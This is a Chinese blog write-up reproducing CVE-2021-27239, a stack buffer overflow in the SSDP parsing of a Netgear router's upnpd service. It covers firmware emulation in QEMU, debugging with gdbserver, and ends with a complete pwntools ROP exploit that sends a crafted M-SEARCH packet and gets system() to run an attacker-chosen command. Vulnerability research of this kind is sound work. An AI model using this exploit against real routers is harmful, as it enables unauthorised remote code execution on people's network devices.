# CVE-2021-27239 漏洞复现 - xshhc - 博客园

> 原文：[`www.cnblogs.com/xshhc/p/17365932.html`](https://www.cnblogs.com/xshhc/p/17365932.html)

在此感谢 tolele 师傅的帮助参考链接

```
https://toleleyjl.github.io/2023/04/09/CVE-2021-27239%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/ https://toleleyjl.github.io/2023/02/16/CVE-2021-34991%E5%A4%8D%E7%8E%B0/ https://xuanxuanblingbling.github.io/iot/2021/11/01/netgear/ https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F
https://paper.seebug.org/1311/#qemu
```

漏洞概述 CVE-2021-27239 该漏洞位于路由器的 UPnP 服务中， 由于解析 SSDP 协议数据包的代码存在缺陷，导致未经授权的远程攻击者可以发送特制的数据包使得栈上的 buffer 溢出，进一步控制 PC 执行任意代码。路由器固件[下载](https://kb.netgear.com/000062417/R6700v3-Firmware-Version-1-0-4-102)不过由于刚开始接触 IOT ，先了解下 UPnP 服务和 SSDP 协议，以下信息来自 chatgptUPnP 服务：UPnP（通用即插即用）服务是一种基于 UPnP 协议，用于实现设备之间互相发现和交谈的服务。UPnP 服务通常可以包括多种类型的服务，例如媒体服务器服务、打印机服务、网络存储服务等等。UPnP 服务通常在设备之间使用 HTTP 协议进行通信，设备可以通过 HTTP 请求（如 HTTP GET、POST 等）来查询其他设备的服务，并且根据查询结果来做出相应的操作。因此，UPnP 服务也称为互联网设备联盟设备控制协议（UPnP Device Control Protocol）。在 UPnP 服务架构中，设备通常包含一个设备描述文档（Device Description Document），它定义了设备的基本信息、属性、状态、可用服务等。设备描述文档基于 XML 格式编写，由设备厂商提供。需要注意的是，UPnP 服务的开放性和易用性也带来了安全风险。未经适当保护的 UPnP 服务可能会被黑客利用，从而导致网络受到攻击。为了减轻这种风险，DOWNUPnP Forum 和其他组织已经制定了一些 UPnP 安全模型和 UPnP 安全指南，旨在帮助设备生产厂商和用户加强对 UPnP 服务的管控和保护。SSDP 协议：SSDP（Simple Service Discovery Protocol），简单服务发现协议，是一种基于 UPnP（通用即插即用）协议的服务发现协议。SSDP 的实质是通过 UDP 协议在局域网中发送广播通告或组播通告，从而实现局域网内的设备自动发现、自组网和服务发现。SSDP 通常用于网络设备、智能家居等场景中，它可以让设备自动发现其他设备，并且了解这些设备支持哪些服务和功能。SSDP 协议默认监听 UDP 1900 端口，并且通过 IP 多播方式向局域网内的所有设备发送服务发现消息。设备收到这个消息后，会向发送者回复一个包含自身信息的消息。这样，设备就可以通过不断地互相交流，建立起一个网络拓扑结构，并且了解其他设备的服务和功能。当一个设备新加入网络时，它可以向其他设备发送服务发现消息，从而让其他设备找到自己并且建立连接。需要注意的是，由于 SSDP 协议使用 UDP 广播和多播方式，理论上来说这种方式存在一定的安全风险，攻击者可以通过发送恶意消息来干扰网络正常运行。因此，在实际应用中，应该采取相应的措施来加强网络安全，比如限制广播或者多播的范围，使用更安全的传输协议，或者开启相关的安全措施，如身份验证和加密等。SSDP 协议的请求和响应报文都是基于 HTTP/1.1 协议格式的，具体格式如下：请求报文:

```
M-SEARCH * HTTP/1.1 HOST: 239.255.255.250:1900 MAN: "ssdp:discover" ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1 # 查询的设备类型或服务类型
MX: 3
```

其中，M-SEARCH 表示多播搜索请求，*表示搜索全局范围内所有设备。HOST 指定了目的地地址和端口，SSDP 协议默认使用 239.255.255.250:1900 进行多播搜索。MAN 表示搜索类型，ssdp:discover 表示简单服务发现机制。ST 表示搜索目标，即设备或服务类型，这里指定了一个特殊的设备类型 InternetGatewayDevice。MX 表示最大响应等待时间。响应报文：

```
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=1800 DATE: Fri, 16 Apr 2021 07:54:52 GMT
EXT:
LOCATION: http://192.168.1.1:80/rootDesc.xml
SERVER: Linux/2.4.17 UPnP/1.0 miniupnpd/1.7 ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1 USN: uuid:UPnP-InternetGatewayDevice-1_0-000666777888::urn:schemas-upnp-org:device:InternetGatewayDevice:1/
```

响应报文中，第一行 HTTP 状态码 200 表示请求成功。CACHE-CONTROL 指定设备或服务的缓存时间，单位为秒。LOCATION 指定了设备或服务的描述文档地址，即 rootDesc.xml 文件。ST 和 USN 分别表示设备或服务的类型和唯一识别号。EXT 指定了设备或服务支持的扩展协议，这里为空。SERVER 指定了设备或服务的操作系统和应用程序名称和版本信息。`漏洞成因漏洞位于 /usr/sbin/upnpd，是 ssdp（UDP 1900）协议的解析过程中，对 MX 字段的 strncpy 引发的栈溢出。binwalk 提取文件，最终将 /usr/sbin/upnpd 丢到 IDA 反汇编，可以知道是一个 32 为 arm 小端序二进制可执行文件

![](img/6ff1f8767615ea1f4c60ab86d3e177fc.png)

且没有开启 Canary 和 PIEIDA 中搜寻 MX 字符串，最终找到漏洞

![](img/57014b8a587d133d148a96b977957516.png)

其中的 v5 - (v4 + 3) 表示 MX 字段数据的长度，说明并没有限制数据字节大小，那么就可以直接栈溢出固件模拟首先要下载内核镜像文件、文件系统和启动文件

```
https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress
https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress/
```

这样才能进行系统级模拟，不够现在貌似下载不了资源了

```
#! /bin/bash
#创建一个虚拟网卡和虚拟机交互
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.6.1/24 # qemu 系统级模拟
qemu-system-arm -M vexpress-a9 \ -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \ -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \ -append "root=/dev/mmcblk0p2" \ -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

将其写入 start.sh 文件，然后运行

不过会报

![](img/aacbb8a8af825b7956019a5c98228d7e.png)

这里需要执行

```
qemu-img resize debian_wheezy_armhf_standard.qcow 32G
```

这样重新执行就可以正常模拟了（感谢 tolele 师傅的帮助）

经过漫长等待后，输入账号密码 root : root

```
# 配置虚拟网卡，用于宿主机交互
ifconfig eth0 192.168.6.2/24 # 挂载
mount -t proc /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev
chroot ./squashfs-root/ sh
```

配置虚拟网卡，这样虚拟机就能和物理机进行网络连接了，然后挂载，切换进程根目录

```
python3 -m http.server 8888 wget 192.168.6.1:8888/file_name
```

利用 python3 在物理机开启一个 web 服务在 8888 端口，这样就能在虚拟机利用 wget 下载物理机的文件到虚拟机如果直接执行 /urs/sbin/upnpd 会报 /dev/nvram: No such file or directory

![](img/2a31b54afb6bfe8a1b34dc1037858d64.png)

显示没有 NVRAM 文件。NVRAM（Non-Volatile Random Access Memory）是一种非易失性随机存取存储器，它能够在断电时保存数据。固件模拟与 NVRAM 有关系，因为在进行固件模拟时，我们需要模拟整个嵌入式系统的运行环境，包括系统配置信息、参数和状态等。这些信息通常存储在 NVRAM 中，并在系统启动时被读取。通过 [`uclibc.org/downloads/binaries/0.9.30/`](https://uclibc.org/downloads/binaries/0.9.30/) 下载交叉编译工具，然后在 [`github.com/therealsaumil/custom_nvram`](https://github.com/therealsaumil/custom_nvram) 下载模拟源码，最后编译后利用 8888 端口上传到虚拟机中

```
./armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so
```

然后执行

```
LD_PRELOAD="/nvram.so /libdl.so.0" /usr/sbin/upnpd
```

这时候会发现成功启动了

![](img/d01ea97fb8bffcd6327367aa54b5e1eb.png)

可以看到成功开启

![](img/44b0638376bb663e5010b020e5b89271.png)

触发漏洞与远程调试

```
from pwn import * p = remote("192.168.6.2", 1900, typ='udp')
context.log_level = 'debug' pld = b'M-SEARCH * HTTP/1.1 \r\n' pld += b'Man:"ssdp:discover" \r\n' pld += b'MX:' + b'a'*160 + b' \r\n' p.send(pld)
```

触发栈溢出在 [链接](https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver) 下载 gdb-server ，在虚拟机开放一个调试端口，这样就能在物理机调试了虚拟机 LD_PRELOAD="/nvram.so /libdl.so.0" /usr/sbin/upnpd & /bin/sh # 寻找 upnpd 进程号 ps | grep upnpd ./gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach 0.0.0.0:12345 upnpd_pid 宿主机 gdb-multiarch set architecture arm target remote 192.168.6.2:12345 同样用上面简单的 payload 来触发栈溢出调试看看，LD_PRELOAD="/nvram.so /libdl.so.0" /usr/sbin/upnpd & /bin/sh ps | grep upnpd![0](img/804b3dd1b0b6415d5d3772c7bc2c16e1.png)找到 /usr/sbin/upnpd 的进程号./gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach 0.0.0.0:12345 2515 宿主机起用 gdb![0](img/9994984379ed35361bd60d638b3b6e7a.png)设置系统架构，然后监听端口 set architecture arm target remote 192.168.6.2:12345 然后就能愉快地调试了![0](img/4c37cafded87b502bc3ae297905189ae.png)将断点打到 0x22dc0![0](img/6d8e693c525cd78034936a7212d2b6a4.png)当执行完 pop { r4, r5, r6, pc } 后，pc 就被劫持 aaaa 了，之后程序便崩溃了![0](img/f3572fba68b347a898479f51224f7bcf.png)触发栈溢出在 [链接](https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver) 下载 gdb-server ，在虚拟机开放一个调试端口，这样就能在物理机调试了虚拟机

```
LD_PRELOAD="/nvram.so /libdl.so.0" /usr/sbin/upnpd & /bin/sh # 寻找 upnpd 进程号
ps | grep upnpd
./gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach 0.0.0.0:12345 upnpd_pid
```

宿主机

```
gdb-multiarch
set architecture arm
target remote 192.168.6.2:12345
```

同样用上面简单的 payload 来触发栈溢出调试看看

```
LD_PRELOAD="/nvram.so /libdl.so.0" /usr/sbin/upnpd & /bin/sh
ps | grep upnpd
```

![](img/be05602bc0d76a8abf053271425282c6.png)

找到 /usr/sbin/upnpd 的进程号

```
./gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach 0.0.0.0:12345 2515
```

宿主机起用 gdb

![](img/90265eb92cdd198e3fb28a9fbd1e5188.png)

设置系统架构，然后监听端口

```
set architecture arm
target remote 192.168.6.2:12345
```

然后就能愉快地调试了

![](img/9daafbee6423b61a2c6f802f57767853.png)

将断点打到 0x22dc0

![](img/121a300bd5ab44a58c0d9c6a791d3a25.png)

当执行完 pop { r4, r5, r6, pc } 后，pc 就被劫持 aaaa 了，之后程序便崩溃了

![](img/6e475c9febeb7cda9365ea79cc93e974.png)

漏洞利用及 exp 编写

```
from pwn import * p = remote("192.168.6.2", 1900, typ='udp')
context.log_level = 'debug' payload = b'M-SEARCH * HTTP/1.1\r\n' payload += b'Man:"ssdp:discover"\r\n' payload += b'MX:' payload += b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab' payload += b'\r\n\x00' p.send(payload)
```

首先要利用上面 payload 来找出溢出长度![0](img/7bbfd543f16e90fac797817c5bdf9f6e.png)可以看到溢出长度要足够我们能够控制 pc 需为 140(0x8c)并且如果我们的 exp 如下的时候

```
from pwn import * p = remote("192.168.6.2", 1900, typ='udp')
context.log_level = 'debug' payload = b'M-SEARCH * HTTP/1.1\r\n' payload += b'Man:"ssdp:discover"\r\n' payload += b'MX:' payload += b'a' * 0x8c payload += b'\x08\x39\x01\r\n\x00' payload += b'stopstop'*0x8 p.send(payload)
```

![0](img/faab1bf2e720f6da30790bf6e2006710.png)可以看到 \r\n\x00 之后的数据被读到到距离 sp 0x770 处的位置

```
.text:00017DD8 04 00 A0 E1                   MOV  R0, R4; command
.text:00017DDC 20 CC FF EB                   BL system

.text:00013908 02 DB 8D E2                   ADD SP, SP, #0x800
.text:0001390C 70 80 BD E8                   POP {R4-R6,PC}

.text:0000BB44 04 00 A0 E1                   MOV R0, R4 ; dest
.text:0000BB48 0D 10 A0 E1                   MOV R1, SP ; src
.text:0000BB4C F2 FE FF EB                   BL strcpy
.text:0000BB50 01 DB 8D E2                   ADD SP, SP, #0x400
.text:0000BB54 70 80 BD E8                   POP {R4-R6,PC}
```

我们可以利用上面三处 gadget 先控制 rsp 指向构造的 command 处，控制 R4 为 data 段上地址，再利用 strcpy 来复制 command 到 data 段上，接着再一次控制 pc，到 system 执行。和寻常 arm 架构的 ctf pwn 题差不多 exp

```
from pwn import * p = remote("192.168.6.2", 1900, typ='udp')
context.log_level = 'debug' command = b'ls' payload = b'M-SEARCH * HTTP/1.1\r\n' payload += b'Man:"ssdp:discover"\r\n' payload += b'MX:' payload += b'a' * 0x8c payload += b'\x08\x39\x01\r\n\x00' # add sp, 0x800
payload += b'a' * 0xa5 payload += p32(0x000CD000) # .data
payload += b'a' * 8 payload += p32(0x0000BB44) # strcpy
payload += command.ljust(0x400, b'\x00')
payload += p32(0x000CD000) # .data
payload += b'a' * 8 payload += p32(0x00017DD8) #system
 p.send(payload)
```